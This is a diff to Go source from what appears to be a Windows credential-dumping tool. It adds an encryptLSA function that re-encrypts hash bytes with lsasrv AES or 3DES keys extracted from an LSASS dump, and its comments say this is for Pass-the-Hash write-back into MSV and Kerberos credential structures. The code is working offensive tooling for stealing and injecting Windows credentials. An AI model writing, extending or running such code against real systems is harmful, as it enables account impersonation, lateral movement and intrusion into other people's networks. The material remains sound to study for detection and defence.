@@ -174,3 +174,49 @@ func decryptLSA(ct []byte, k *lsaKey) ([]byte, error) {
 	mode.CryptBlocks(out, ct)
 	return out, nil
 }
+
+// encryptLSA is the inverse of decryptLSA — used by Pass-the-Hash
+// write-back to re-encrypt fresh hash bytes with the lsasrv keys
+// extracted from the same dump. The cipher selection follows the
+// same length heuristic as decryptLSA: blobs that align to 16 use
+// AES, blobs that align to 8 (only) use 3DES, anything else is an
+// alignment error.
+//
+// The plaintext length determines the cipher; lsasrv's CBC scheme
+// has no padding, so callers must pre-pad the plaintext to whatever
+// alignment matches the original ciphertext (typically 16-byte
+// alignment for MSV / Kerberos credential structs).
+//
+// Returns a NEW slice. On wrong key / mis-aligned plaintext the
+// caller has no validation tag — this matches the lsasrv contract.
+func encryptLSA(plain []byte, k *lsaKey) ([]byte, error) {
+	if k == nil {
+		return nil, fmt.Errorf("%w: nil lsaKey", ErrKeyExtractFailed)
+	}
+	if len(plain) == 0 {
+		return nil, nil
+	}
+	var block cipher.Block
+	switch {
+	case len(plain)%16 == 0:
+		if k.AES == nil {
+			return nil, fmt.Errorf("%w: AES key not loaded", ErrKeyExtractFailed)
+		}
+		block = k.AES
+	case len(plain)%8 == 0:
+		if k.TripleDES == nil {
+			return nil, fmt.Errorf("%w: 3DES key not loaded", ErrKeyExtractFailed)
+		}
+		block = k.TripleDES
+	default:
+		return nil, fmt.Errorf("%w: plaintext length %d not aligned to 8 or 16", ErrKeyExtractFailed, len(plain))
+	}
+	if len(k.IV) < block.BlockSize() {
+		return nil, fmt.Errorf("%w: IV length %d < block size %d",
+			ErrKeyExtractFailed, len(k.IV), block.BlockSize())
+	}
+	mode := cipher.NewCBCEncrypter(block, k.IV[:block.BlockSize()])
+	out := make([]byte, len(plain))
+	mode.CryptBlocks(out, plain)
+	return out, nil
+}
